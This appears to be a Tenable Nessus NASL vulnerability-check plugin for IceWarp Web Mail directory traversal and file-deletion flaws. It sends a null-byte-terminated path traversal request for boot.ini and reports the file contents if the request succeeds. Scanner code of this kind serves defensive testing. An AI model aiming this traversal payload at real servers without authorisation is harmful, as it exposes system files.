#
# (C) Tenable Network Security
#
#

 desc["english"] = "
Synopsis :

It is possible to retrieve/delete local files on the remote system through
the WebMail.

Description :

The remote host is running IceWarp Web Mail - a webmail solution
available for the Microsoft Windows platform. 

The remote version of this software is vulnerable to a Directory
Traversal vulnerability that may allow an attacker to retrieve
arbitrary files on the system. 

Another input validation flaw allows to delete arbitrary files on the
remote host. 

Note : this flaw indicates IceWarp is vulnerable to cross-site
scripting attacks too. 

See also : 

http://marc.theaimsgroup.com/?l=bugtraq&m=112810385104168&w=2

Solution : 

None at this time.

Risk factor : 

High / CVSS Base Score : 9 
(AV:R/AC:L/Au:NR/C:C/A:P/I:C/B:N)";

if (description)
{
 script_id(19784);
 script_cve_id("CVE-2005-3131", "CVE-2005-3132", "CVE-2005-3133");
 script_bugtraq_id(14988, 14986, 14980);
 script_version ("$Revision: 1.4 $");

 script_name(english:"IceWarp Web Mail Multiple Flaws (4)");

 script_description(english:desc["english"]);
 script_summary(english:"Check the version of IceWarp WebMail");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 script_dependencie("icewarp_webmail_vulns.nasl");
 script_require_ports("Services/www", 32000);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:32000);

version = get_kb_item("www/" + port + "/icewarp_webmail/version");
if ( ! version ) exit(0);

req = "/accounts/help.html?helpid=../../../../../../../../../../../../boot.ini%00";

req = http_get(item:req, port:port);
r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if ( r == NULL ) exit(0);

r = strstr (r, "[boot loader]");
if (isnull(r)) exit (0);

report = string (desc["english"],
		"\n\nPlugin output :\n\n",
		"It was possible to retrieve the file boot.ini :\n\n",
		r);

security_hole (port:port, data:report);
